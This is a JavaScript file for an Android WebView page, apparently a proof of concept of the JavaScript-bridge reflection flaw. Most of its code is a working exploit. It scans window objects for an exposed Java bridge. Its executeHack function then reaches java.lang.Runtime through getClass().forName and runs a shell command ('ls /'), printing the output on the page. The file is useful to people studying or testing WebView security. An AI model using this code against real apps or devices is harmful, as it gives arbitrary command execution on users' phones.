      var logP;
      var  javaObj;

window.onload = function() {
        var p = document.getElementById('dis');
        logP = document.getElementById('log');
        var btn =  document.getElementById("button");
        var toast = document.getElementById("toast");

        toast.addEventListener('click', function() {
           jsInterface.onButtonClick("toast");
        });

        btn.addEventListener('click', function () {
            if(typeof jsInterface != 'undefined') {
                p.innerText = "java called";
                log("java called");
                jsInterface.onButtonClick("button click");
            }             else {
                p.innerText = "java call failed";
                log("java call failed");
            }
            executeHack();

        });

        console.log("hahahhahaha :" + jsInterface.getClass);

        for( var obj in window) {
            if(window[obj] != null &&   "getClass" in window[obj]) {
                log(obj);
                console.log(obj);
                javaObj = window[obj];
            }
            console.log(window[obj]);
        }
     }

        var log = function (logMsg) {
            var str = logP.innerHTML;
            console.log(str);
            str += logMsg + "<br/>";
            logP.innerHTML = str  ;
        }

function executeHack () {
var i=0;
      function getContents(inputStream)
      {
        var contents = ""+i;
        var b = inputStream.read();
        var i = 1;
        while(b != -1) {
            var bString = String.fromCharCode(b);
            contents += bString;
            contents += "\n"
            b = inputStream.read();
        }
        i=i+1;
        return contents;
       }

       function execute(cmdArgs)
               {

                        return javaObj.getClass().forName("java.lang.Runtime").
                            getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);

               }

log("hacking");
//try {
log("getclass:" + javaObj.getClass);
      var p = execute(["ls","/"]);
      log(getContents(p.getInputStream()));
//      }catch(e) {
//      log(e);
//      }
}